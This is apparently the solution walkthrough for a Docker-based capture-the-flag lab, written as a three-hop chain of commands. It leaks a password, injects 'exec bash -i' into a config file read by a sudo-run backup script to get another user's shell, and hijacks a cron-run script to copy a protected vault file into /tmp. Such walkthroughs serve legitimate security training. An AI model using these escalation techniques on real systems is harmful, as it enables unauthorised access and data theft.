Build with:
docker build -t ironveil-exfil .
Then run with
docker run --rm -it --hostname ironveil ironveil-exfil

Hop 1: vance -> orchid
cat /srv/share/handover_notes.txt
su - orchid                      # orchid_analyst_15g1s
cat ~/flag1.txt

Hop 2: orchid -> kaito (shell)
cat ~/ops_handover.txt
sudo -l
cat /usr/local/bin/ironveil-backup
ls -l /opt/ironveil/operators/orchid.conf
echo 'exec bash -i' >> /opt/ironveil/operators/orchid.conf
sudo -u kaito /usr/local/bin/ironveil-backup
#  --- now in a kaito shell ---
cat /home/kaito/flag2.txt

Hop 3: kaito -> arisawa (cron exploit)
Note that the copy must specifically go in /tmp/ as that is the only folder in this minimal distro with rw perms for both arasawa AND kaito
cat /etc/cron.d/vault-rotate
cat > /opt/vault/rotate_cache.sh <<'EOF'
#!/bin/bash
cat /srv/vault/neural_manifest.dat > /tmp/.manifest
chmod 0644 /tmp/.manifest
EOF
for i in $(seq 1 70); do [ -s /tmp/.manifest ] && break; sleep 1; done
cat /tmp/.manifest